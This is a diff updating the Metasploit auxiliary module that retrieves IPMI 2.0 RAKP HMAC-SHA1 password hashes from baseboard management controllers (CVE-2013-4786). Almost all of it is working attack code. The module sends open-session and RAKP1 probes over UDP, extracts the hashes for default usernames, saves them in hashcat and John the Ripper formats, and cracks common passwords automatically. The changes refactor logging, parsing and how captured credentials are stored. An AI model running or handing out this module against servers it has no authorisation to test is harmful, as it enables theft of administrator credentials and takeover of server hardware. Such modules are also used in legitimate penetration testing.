@@ -1,22 +1,19 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
 require 'rex/proto/ipmi'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
-      'Name'        => 'IPMI 2.0 RAKP Remote SHA1 Password Hash Retreival',
+      'Name'        => 'IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval',
       'Description' => %q|
-        This module identifies IPMI 2.0 compatible systems and attempts to retrieve the
+        This module identifies IPMI 2.0-compatible systems and attempts to retrieve the
         HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a
         file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb
         in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300.
@@ -25,7 +22,11 @@ class Metasploit3 < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'References'  =>
         [
-          ['URL', 'http://fish2.com/ipmi/remote-pw-cracking.html']
+          ['URL', 'http://fish2.com/ipmi/remote-pw-cracking.html'],
+          ['URL', 'https://seclists.org/bugtraq/2014/Apr/16'], # HP's SSRT101367
+          ['CVE', '2013-4786'],
+          ['OSVDB', '95057'],
+          ['BID', '61076'],
         ],
       'DisclosureDate' => 'Jun 20 2013'
     )
@@ -42,13 +43,33 @@ class Metasploit3 < Msf::Auxiliary
       OptString.new('OUTPUT_HASHCAT_FILE', [false, "Save captured password hashes in hashcat format"]),
       OptString.new('OUTPUT_JOHN_FILE', [false, "Save captured password hashes in john the ripper format"]),
       OptBool.new('CRACK_COMMON', [true, "Automatically crack common passwords as they are obtained", true])
-    ], self.class)
+    ])
 
+  end
+
+  def post_auth?
+    true
+  end
+
+  def default_cred?
+    true
+  end
+
+  def ipmi_status(msg)
+    vprint_status("#{rhost}:#{rport} - IPMI - #{msg}")
+  end
+
+  def ipmi_error(msg)
+    vprint_error("#{rhost}:#{rport} - IPMI - #{msg}")
+  end
+
+  def ipmi_good(msg)
+    print_good("#{rhost}:#{rport} - IPMI - #{msg}")
   end
 
   def run_host(ip)
 
-    vprint_status("#{ip}:#{rport} - IPMI - Sending IPMI probes")
+    ipmi_status("Sending IPMI probes")
 
     usernames = []
     passwords = []
@@ -71,7 +92,6 @@ class Metasploit3 < Msf::Auxiliary
     passwords << ""
     passwords = passwords.uniq
 
-
     self.udp_sock = Rex::Socket::Udp.create({'Context' => {'Msf' => framework, 'MsfExploit' => self}})
     add_socket(self.udp_sock)
 
@@ -81,10 +101,11 @@ class Metasploit3 < Msf::Auxiliary
       console_session_id = Rex::Text.rand_text(4)
       console_random_id  = Rex::Text.rand_text(16)
 
-      vprint_status("#{rhost}:#{rport} - IPMI - Trying username '#{username}'...")
+      ipmi_status("Trying username '#{username}'...")
 
       rakp = nil
       sess = nil
+      sess_data = nil
 
       # It may take multiple tries to get a working "session" on certain BMCs (HP iLO 4, etc)
       1.upto(5) do |attempt|
@@ -97,53 +118,67 @@ class Metasploit3 < Msf::Auxiliary
         end
 
         unless r
-          vprint_status("#{rhost}:#{rport} - IPMI - No response to IPMI open session request")
+          ipmi_status("No response to IPMI open session request")
           rakp = nil
           break
         end
 
         sess = process_opensession_reply(*r)
         unless sess
-          vprint_status("#{rhost}:#{rport} - IPMI - Could not understand the response to the open session request")
+          ipmi_status("Could not understand the response to the open session request")
           rakp = nil
           break
         end
 
+        if sess.data.length < 8
+          ipmi_status("Refused IPMI open session request")
+          rakp = nil
+          break
+        end
+
+        sess_data = Rex::Proto::IPMI::Session_Data.new.read(sess.data)
+
         r = nil
         1.upto(3) do
-          udp_send(Rex::Proto::IPMI::Utils.create_ipmi_rakp_1(sess.bmc_session_id, console_random_id, username))
+          udp_send(Rex::Proto::IPMI::Utils.create_ipmi_rakp_1(sess_data.bmc_session_id, console_random_id, username))
           r = udp_recv(5.0)
           break if r
         end
 
         unless r
-          vprint_status("#{rhost}:#{rport} - IPMI - No response to RAKP1 message")
+          ipmi_status("No response to RAKP1 message")
           next
         end
 
         rakp = process_rakp1_reply(*r)
         unless rakp
-          vprint_status("#{rhost}:#{rport} - IPMI - Could not understand the response to the RAKP1 request")
+          ipmi_status("Could not understand the response to the RAKP1 request")
           rakp = nil
           break
         end
 
         # Sleep and retry on session ID errors
         if rakp.error_code == 2
-          vprint_error("#{rhost}:#{rport} - IPMI - Returned a Session ID error for username #{username} on attempt #{attempt}")
+          ipmi_error("Returned a Session ID error for username #{username} on attempt #{attempt}")
           Rex.sleep(1)
           next
         end
 
         if rakp.error_code != 0
-          vprint_error("#{rhost}:#{rport} - IPMI - Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}")
+          ipmi_error("Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}")
           rakp = nil
           break
         end
 
         # TODO: Finish documenting this error field
         if rakp.ignored1 != 0
-          vprint_error("#{rhost}:#{rport} - IPMI - Returned error code #{rakp.ignored1} for username #{username}")
+          ipmi_error("Returned error code #{rakp.ignored1} for username #{username}")
+          rakp = nil
+          break
+        end
+
+        # Check if there is hash data
+        if rakp.data.length < 56
           rakp = nil
           break
         end
@@ -153,45 +188,35 @@ class Metasploit3 < Msf::Auxiliary
       end
 
       # Skip to the next user if we didnt get a valid response
-      next if not rakp
+      next if !rakp
 
       # Calculate the salt used in the hmac-sha1 hash
+      rakp_data = Rex::Proto::IPMI::RAKP2_Data.new.read(rakp.data)
       hmac_buffer = Rex::Proto::IPMI::Utils.create_rakp_hmac_sha1_salt(
         console_session_id,
-        sess.bmc_session_id,
+        sess_data.bmc_session_id,
         console_random_id,
-        rakp.bmc_random_id,
-        rakp.bmc_guid,
+        rakp_data.bmc_random_id,
+        rakp_data.bmc_guid,
         0x14,
         username
       )
 
       sha1_salt = hmac_buffer.unpack("H*")[0]
-      sha1_hash = rakp.hmac_sha1.unpack("H*")[0]
+      sha1_hash = rakp_data.hmac_sha1.unpack("H*")[0]
 
       if sha1_hash == "0000000000000000000000000000000000000000"
-        vprint_error("#{rhost}:#{rport} - IPMI - Returned a bogus SHA1 hash for username #{username}")
+        ipmi_error("Returned a bogus SHA1 hash for username #{username}")
         next
       end
 
-      found = "#{rhost}:#{rport} - IPMI - Hash found: #{username}:#{sha1_salt}:#{sha1_hash}"
-      print_good(found)
+      ipmi_good("Hash found: #{username}:#{sha1_salt}:#{sha1_hash}")
 
       write_output_files(rhost, username, sha1_salt, sha1_hash)
 
       # Write the rakp hash to the database
-      report_auth_info(
-        :host	=> rhost,
-        :port   => rport,
-        :proto  => 'udp',
-        :sname	=> 'ipmi',
-        :user 	=> username,
-        :pass   => "#{sha1_salt}:#{sha1_hash}",
-        :source_type => "captured",
-        :active => true,
-        :type   => 'rakp_hmac_sha1_hash'
-      )
-
+      hash = "#{rhost} #{username}:$rakp$#{sha1_salt}$#{sha1_hash}"
+      core_id = report_hash(username, hash)
       # Write the vulnerability to the database
       unless reported_vuln
         report_vuln(
@@ -212,21 +237,11 @@ class Metasploit3 < Msf::Auxiliary
       passwords.uniq.each do |pass|
         pass = pass.strip
         next unless pass.length > 0
-        next unless Rex::Proto::IPMI::Utils.verify_rakp_hmac_sha1(hmac_buffer, rakp.hmac_sha1, pass)
-        print_good("#{rhost}:#{rport} - IPMI - Hash for user '#{username}' matches password '#{pass}'")
+        next unless Rex::Proto::IPMI::Utils.verify_rakp_hmac_sha1(hmac_buffer, rakp_data.hmac_sha1, pass)
+        ipmi_good("Hash for user '#{username}' matches password '#{pass}'")
 
         # Report the clear-text credential to the database
-        report_auth_info(
-          :host	=> rhost,
-          :port   => rport,
-          :proto  => 'udp',
-          :sname	=> 'ipmi',
-          :user 	=> username,
-          :pass   => pass,
-          :source_type => "cracked",
-          :active => true,
-          :type   => 'password'
-        )
+        report_cracked_cred(username, pass, core_id)
         break
       end
     end
@@ -234,17 +249,15 @@ class Metasploit3 < Msf::Auxiliary
 
   def process_opensession_reply(data, shost, sport)
     shost = shost.sub(/^::ffff:/, '')
-    info = Rex::Proto::IPMI::Open_Session_Reply.new(data) rescue nil
-    return if not info
-    return if not info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RMCPPLUSOPEN_REP
+    info = Rex::Proto::IPMI::Open_Session_Reply.new.read(data) rescue nil
+    return unless info && info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RMCPPLUSOPEN_REP
     info
   end
 
   def process_rakp1_reply(data, shost, sport)
     shost = shost.sub(/^::ffff:/, '')
-    info = Rex::Proto::IPMI::RAKP2.new(data) rescue nil
-    return if not info
-    return if not info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RAKP2
+    info = Rex::Proto::IPMI::RAKP2.new.read(data) rescue nil
+    return unless info && info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RAKP2
     info
   end
 
@@ -263,6 +276,45 @@ class Metasploit3 < Msf::Auxiliary
         fd.flush
       end
     end
+  end
+
+  def service_data
+    {
+      address: rhost,
+      port: rport,
+      service_name: 'ipmi',
+      protocol: 'udp',
+      workspace_id: myworkspace_id
+    }
+  end
+
+  def report_hash(user, hash)
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      private_data: hash,
+      private_type: :nonreplayable_hash,
+      jtr_format: 'rakp',
+      username: user,
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    cl = create_credential_login(login_data)
+    cl ? cl.core_id : nil
+  end
+
+  def report_cracked_cred(user, password, core_id)
+    cred_data = {
+      core_id: core_id,
+      username: user,
+      password: password
+    }
+
+    create_cracked_credential(cred_data)
   end
 
   #
@@ -292,5 +344,4 @@ class Metasploit3 < Msf::Auxiliary
   def rport
     datastore['RPORT']
   end
-
 end
